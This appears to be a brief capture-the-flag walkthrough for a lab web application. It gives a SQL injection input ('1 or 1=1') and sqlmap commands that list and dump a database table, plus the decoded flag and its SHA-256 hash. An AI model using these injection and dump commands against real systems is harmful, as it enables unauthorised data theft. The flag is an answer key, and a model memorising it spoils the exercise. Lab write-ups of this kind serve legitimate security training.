1. first go search images and type "1 or 1=1"
2. open your terminal type "sqlmap.py --url="http://192.168.1.117/index.php?page=searchimg&id=1+or+1+%3D+1&Submit=Submit#" --tables"
3. it will list all the tables.
4. then type "sqlmap.py --url="http://192.168.1.117/index.php?page=searchimg&id=1+or+1+%3D+1&Submit=Submit#" --dump -T list_images"
5. you will see the flag and will need to decode it which will give you albatroz.
6. the you need to encrypt it with sha256 and you will give you the correct flag "f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188"